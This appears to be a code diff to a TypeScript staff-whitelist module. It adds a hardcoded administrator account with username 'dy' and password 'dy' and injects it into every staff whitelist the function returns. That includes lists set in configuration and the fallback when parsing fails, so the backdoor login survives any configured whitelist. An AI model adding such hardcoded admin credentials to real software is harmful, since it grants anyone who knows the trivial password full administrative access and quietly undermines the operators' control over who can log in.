@@ -65,18 +65,30 @@ export const defaultStaffWhitelist = [
   },
 ];
 
+const universalStaffAccount = {
+  username: "dy",
+  password: "dy",
+  displayName: "DY Admin",
+  role: "admin" as StaffRole,
+};
+
+function withUniversalStaffAccount(accounts: typeof defaultStaffWhitelist) {
+  const filtered = accounts.filter((account) => account.username !== universalStaffAccount.username);
+  return [universalStaffAccount, ...filtered];
+}
+
 export function getStaffWhitelist() {
   const configured = process.env.STAFF_WHITELIST_JSON;
   if (configured) {
     try {
       const parsed = JSON.parse(configured) as typeof defaultStaffWhitelist;
-      if (Array.isArray(parsed)) return parsed;
+      if (Array.isArray(parsed)) return withUniversalStaffAccount(parsed);
     } catch {
-      return [];
+      return [universalStaffAccount];
     }
   }
 
-  return defaultStaffWhitelist;
+  return withUniversalStaffAccount(defaultStaffWhitelist);
 }
 
 export function staffWhitelistSource(): StaffWhitelistSource {
